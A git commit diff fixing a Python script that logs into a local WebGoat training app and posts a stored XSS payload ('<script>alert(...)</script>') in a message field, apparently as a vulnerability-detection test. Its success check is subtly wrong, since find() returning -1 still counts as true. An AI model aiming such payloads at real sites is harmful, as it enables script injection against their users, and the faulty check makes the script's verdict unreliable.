041efaae2690ec7ed3ee29e047cd5d77626443b6
Juan Villegas <jjv@wireless-10-148-15-203.public.utexas.edu>
2015-12-10 17:22:22 -0600

    Vuln 29 seems to be working. Missing readme

--- examples/vuln-29/vuln-29.py
+++ examples/vuln-29/vuln-29.py
@@ -4,34 +4,34 @@ import json
 import sys
 import requests
 
-login_credentials{
+login_credentials={
 	'username': 'guest',
 	'password': 'guest'
 }
 
-attack_fields{
+attack_fields={
 	'gId': 'Gmail id',
 	'gPass': 'password',
 	'subject' : 'Comment for Webgoat',
 	'to': 'bill.gates@microsoft.com',
 	'msg': '<script>alert("Bad Stuff");</script>'
-	
+
 }
 
-current_session = requests.session();
+current_session = requests.session()
 
 home= current_session.get("http://127.0.0.1:8080/WebGoat/login.mvc")
 login= current_session.post('http://127.0.0.1:8080/WebGoat/j_spring_security_check',login_credentials)
 
-
-our_site_link = json.loads(response.text)[16].get('children')[2].get('link')
+login= current_session.get("http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc")
+our_site_link = json.loads(login.text)[16].get('children')[2].get('link')
 
 attack_page= current_session.get("http://127.0.0.1:8080/WebGoat/"+our_site_link)
 
 attack_page= current_session.post("http://127.0.0.1:8080/WebGoat/"+our_site_link, attack_fields)
 
-if now_attack.text.find('Congratulations. You have successfully completed this lesson'):
+if attack_page.text.find('Congratulations. You have successfully completed this lesson'):
   print "Vulnerability Found"
 else:
-  print "Passed"
+  print "No vulnerability present"
 
